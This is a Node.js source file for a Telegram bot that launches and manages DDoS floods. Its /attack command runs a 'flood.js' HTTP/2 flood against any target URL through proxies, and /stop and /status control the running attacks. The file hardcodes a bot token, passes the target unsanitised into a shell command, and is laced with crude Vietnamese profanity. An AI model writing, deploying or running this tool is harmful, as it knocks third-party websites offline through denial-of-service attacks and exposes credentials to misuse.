// bot.js - thằng chó này chạy trên github
const { Telegraf } = require('telegraf');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

const BOT_TOKEN = '8908538640:AAHDBu7O5-zMBX5NLUqPSiRzWy9NnWsr8Ho';
const bot = new Telegraf(BOT_TOKEN);

// Danh sách admin cho phép dùng - địt mẹ tự thay ID telegram mày vào
const ADMINS = [7959116629]; // Thay bằng ID cặc của mày

bot.start((ctx) => {
    if (!ADMINS.includes(ctx.from.id)) {
        return ctx.reply('Cút mẹ mày đi, không phải admin thì biến');
    }
    ctx.reply('Bot DDoS - QRG出品\n\nCác lệnh:\n/attack <url> <time> <threads> <ratelimit> <proxyfile>\n/stop\n/status');
});

bot.command('attack', (ctx) => {
    if (!ADMINS.includes(ctx.from.id)) return;
    
    const args = ctx.message.text.split(' ');
    if (args.length < 6) {
        return ctx.reply('Sai cặc rồi: /attack <url> <time> <threads> <ratelimit> <proxyfile>');
    }
    
    const target = args[1];
    const time = args[2];
    const threads = args[3];
    const ratelimit = args[4];
    const proxyfile = args[5];
    
    // Kiểm tra file proxy tồn tại chưa
    if (!fs.existsSync(proxyfile)) {
        return ctx.reply(`Địt mẹ, file proxy ${proxyfile} éo tồn tại`);
    }
    
    const cmd = `node flood.js GET "${target}" ${time} ${threads} ${ratelimit} ${proxyfile} --winter --full --http 2`;
    
    ctx.reply(`🔥 Đang địt con mẹ ${target} trong ${time} giây với ${threads} luồng...`);
    
    const process = exec(cmd, { timeout: time * 1000 });
    
    process.stdout.on('data', (data) => {
        console.log(data);
    });
    
    process.stderr.on('data', (data) => {
        console.error(data);
    });
    
    process.on('close', (code) => {
        ctx.reply(`🐸 Xong cặc rồi! Target ${target} đã bị địt trong ${time} giây. Exit code: ${code}`);
    });
});

bot.command('stop', (ctx) => {
    if (!ADMINS.includes(ctx.from.id)) return;
    exec('pkill -f "node flood.js"', (err) => {
        if (err) {
            ctx.reply(`Lỗi vãi lồn: ${err.message}`);
        } else {
            ctx.reply('Đã giết hết mấy thằng DDoS đang chạy');
        }
    });
});

bot.command('status', (ctx) => {
    if (!ADMINS.includes(ctx.from.id)) return;
    exec('ps aux | grep "node flood.js" | grep -v grep', (err, stdout) => {
        if (err || !stdout) {
            ctx.reply('Éo có thằng DDoS nào đang chạy cả');
        } else {
            ctx.reply(`Đang có thằng DDoS chạy:\n${stdout}`);
        }
    });
});

bot.launch();
console.log('Bot cặc to đã chạy - QRG出品');
